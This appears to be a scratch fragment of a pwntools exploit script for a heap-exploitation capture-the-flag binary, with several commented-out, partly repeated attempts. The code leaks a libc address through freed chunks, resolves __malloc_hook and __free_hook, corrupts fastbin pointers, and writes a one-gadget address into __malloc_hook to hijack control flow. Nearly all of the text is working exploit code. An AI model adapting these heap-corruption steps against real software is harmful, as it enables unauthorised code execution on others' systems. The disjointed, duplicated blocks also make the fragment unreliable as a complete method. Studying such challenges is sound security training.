#edit(7, 0, 0x70febabe)
#edit(7, 1, (gadget *0x1000000)&0xfffffffffffffff)
#edit(7, 2, gadget>>(8*5))
#add(sz=1)

"""
rmv(6)
rmv(5)
edit(5, 3+10,libc.symbols['__malloc_hook']-0x10)
add(sz=11)
add(sz=11)
add(sz=11)
edit(10, 0, gadget)
edit(7, 1, 0)
"""
"""
add(sz=100)
add(sz=100)
add(sz=100)
add(sz=100)

rmv(0)
view(0, 0)
addr=int(io.recvline().strip())-0x3c4b78
log.info(hex(addr))
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address=addr
rmv(2)
view(0, 0)
addr=int(io.recvline().strip())-1616
log.info(hex(addr))

malloc_hook = libc.symbols['__malloc_hook']
free_hook = libc.symbols['__free_hook']

add(sz=int(0x71/8))
add(sz=int(0x71/8))
rmv(4)
add(sz=150)
add(sz=-1)
"""
"""
add(sz=100)
add(sz=100)
add(sz=100)
add(sz=100)

rmv(0)
view(0, 0)
addr=int(io.recvline().strip())-0x3c4b78
log.info(hex(addr))
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address=addr
rmv(2)
view(0, 0)
addr=int(io.recvline().strip())-1616
log.info(hex(addr))

malloc_hook = libc.symbols['__malloc_hook']
free_hook = libc.symbols['__free_hook']

heap_chunk = addr
heap_top_chunk = heap_chunk + 0xcc0
add(sz=-1)
edit(4, 0x20/8, 0x6020C0)
add(sz=100)
add(sz=100)
"""
